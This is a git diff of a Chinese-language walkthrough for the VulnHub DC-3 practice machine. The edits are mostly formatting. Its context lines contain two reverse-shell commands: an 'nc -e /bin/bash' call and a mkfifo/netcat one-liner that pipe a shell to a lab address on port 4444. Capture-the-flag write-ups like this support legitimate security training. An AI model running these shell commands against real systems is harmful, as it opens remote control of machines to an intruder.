@@ -1,10 +1,4 @@
-
-
-
-
-
-
-# DC3-WalkThrough
+# DC3-Walk Through
 
 ---
 
@@ -15,6 +9,7 @@
 ---
 
 **靶机地址**
+
 - https://www.vulnhub.com/entry/dc-3,312/
 
 **Description**
@@ -193,7 +188,7 @@ nc -nv 192.168.141.134 4444 -e /bin/bash
 ![](../../../../../../assets/img/Security/安全资源/靶机/VulnHub/DC/DC3/17.png)
 
 谜题解开了,这 TM 是 openbad版本的 nc,我不管,老子就是要弹
-```
+```bash
 rm /tmp/f;mkfifo /tmp/f;cat /tmp/f|/bin/sh -i 2>&1|nc 192.168.141.134 4444 >/tmp/f
 ```
 
